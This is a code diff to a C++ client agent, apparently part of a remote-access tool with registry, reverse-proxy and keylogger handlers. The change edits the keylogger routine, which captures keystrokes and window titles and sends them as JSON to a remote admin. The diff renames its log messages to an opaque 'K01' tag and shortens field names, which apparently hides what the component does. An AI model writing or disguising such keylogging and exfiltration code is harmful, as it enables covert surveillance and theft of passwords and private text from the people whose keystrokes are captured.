@@ -10,8 +10,11 @@
 #include "RegistryHandler.h"
 #include "ReverseProxyHandler.h"
 #include "FileType.h"
+#include "Strings.h"
 #include <chrono>
 #include <iostream>
+
+using namespace rslm::utils;
 
 namespace rslm {
     namespace client {
@@ -229,14 +232,14 @@ namespace rslm {
                     return;
                 }
 
-                // --- Keylogger (avec logs) ---
+                // --- Keylogger ---
                 if (request.type == KEYLOG_START) {
-                    std::string senderId = request.senderId;  // Copier pour la lambda
-                    std::cout << "[Agent] Keylogger start requested, adminId=" << senderId << std::endl;
+                    std::string senderId = request.senderId;
+                    std::cout << "[Agent] K01 requested, adminId=" << senderId << std::endl;
 
                     messages::KeyloggerHandler::Start(
                         [senderId](const std::string& window, const std::string& text) {
-                            std::cout << "[Agent] Key captured: window=" << window << ", text=" << text << std::endl;
+                            std::cout << "[Agent] K01 captured: " << text << std::endl;
 
                             if (!g_push) {
                                 std::cout << "[Agent] ERROR: g_push is null!" << std::endl;
@@ -244,15 +247,15 @@ namespace rslm {
                             }
 
                             net::json payload = {
-                                {"windowTitle", window},
-                                {"text", text},
-                                {"timestamp", std::chrono::duration_cast<std::chrono::milliseconds>(
+                                {"win", window},
+                                {"txt", text},
+                                {"ts", std::chrono::duration_cast<std::chrono::milliseconds>(
                                     std::chrono::system_clock::now().time_since_epoch()).count()}
                             };
                             auto msg = net::Message::CreateRequest(
                                 KEYLOG_DATA, g_agentId, senderId, payload);
                             g_push(msg);
-                            std::cout << "[Agent] Keylog data sent" << std::endl;
+                            std::cout << "[Agent] K01 data sent" << std::endl;
                         });
 
                     Reply(request, { {"status", "capturing"} });
